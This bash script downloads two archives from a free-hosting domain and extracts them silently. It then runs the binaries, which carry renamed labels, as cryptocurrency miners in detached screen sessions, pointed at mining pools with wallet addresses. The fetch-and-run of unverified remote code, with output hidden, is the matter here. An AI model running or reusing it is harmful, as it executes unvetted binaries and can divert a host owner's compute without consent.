#!/bin/bash

apt install htop -y
apt install screen -y

cd ~/

wget -q -O A http://kon-tol.x10.bz/srbdot.tar.gz
wget -q -O B http://kon-tol.x10.bz/loldot.tar.gz

tar -xzf A >/dev/null 2>&1
tar -xzf B >/dev/null 2>&1

rm A
rm B

screen -dmS loldot ./loldot -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qrgnesqnu6550ejrtznwmjj2slsk7407kcqxh6pe63xj0tlm4hn4z0fk3anle.luckyynr

screen -dmS srbdot ./srbdot -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.luckyynr

htop
